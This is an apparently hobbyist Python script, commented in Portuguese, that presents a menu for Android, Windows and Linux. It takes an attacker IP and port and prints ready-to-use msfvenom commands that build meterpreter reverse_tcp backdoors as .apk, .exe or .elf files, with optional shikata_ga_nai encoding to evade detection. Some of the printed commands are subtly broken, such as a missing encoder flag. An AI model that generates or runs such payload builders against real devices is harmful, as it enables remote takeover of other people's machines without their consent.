#C0D3 [Inicio]
print("MSF COMANDs PAYLOADs"), print()
print("[1]: Android"), print("[2]: Windows"), print("[3]: Linux"), print()
#primeira confirmação
pc1=int(input("> "))


if(pc1==1):
    #PAYLOAD ANDROID
    print("[1]: Payload Criptografada"),print("[2]: Payload Normal"), print()
    #Segunda Confirmação
    pc2=int(input("> "))
    if(pc2==1):
        ip1=str(input("set your IP: "))
        p1=int(input("set the port: "))
        print()
        print(" Comand:")
        print("> msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} x86/shikata_ga_nai R > /<difetorio>/nome.apk".format(ip1, p1))
    if(pc2==2):
        ip2=str(input("set your IP: "))
        p2=int(input("set the port: "))
        print()
        print(" Comand:")
        print("> msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} R > /<diretorio>/nome.apk".format(ip2, p2))


if(pc1==2):
    #PAYLOAD WINDOWS
    print("[1]: Payload Criptografada"), print("[2]: Payload Normal"), print()
    #Terceira confirmação
    pc3=int(input("> "))
    if(pc3==1):
        ip3=str(input("set your IP: "))
        p3=int(input("set the port: "))
        print()
        print(" Comand:")
        print("> msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} x86/shikata_ga_nai R > /<diretorio>/nome.exe".format(ip3, p3))
    if(pc3==2):
        ip4=str(input("set your IP: "))
        p4=int(input("set the port: "))
        print()
        print(" Comand:")
        print("> msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} R > /<diretorio>/nome.exe".format(ip4, p4))


if(pc1==3):
    #PAYLOAD LINUX
    print("[1]: Payload Criptografada"), print("[2]: Payload Normal"), print()
    #Quarta confirmação
    pc4=int(input("> "))
    if(pc4==1):
        ip5=str(input("set your IP: "))
        p5=int(input("set the port: "))
        print()
        print(" Comand:")
        print("> msfvenom -p linux/meterpreter/reverse_tcp LHOST={} LPORT={} x86/shikata_ga_nai R > /<diretorio>/nome.elfe".format(ip5, p5))
    if(pc4==2):
        ip6=str(input("ser your IP: "))
        p6=int(input("set the port: "))
        print()
        print("> msfvenom -p linux/meterpreter/reverse_tcp LHOST={} LPORT={} R > /<diretório>/nome.elf".format(ip6, p6))


if(pc1<=0 or pc1>=4):
    print("serviço inválido!")
    print("reinicie o programa")
    print("#script by dreifus")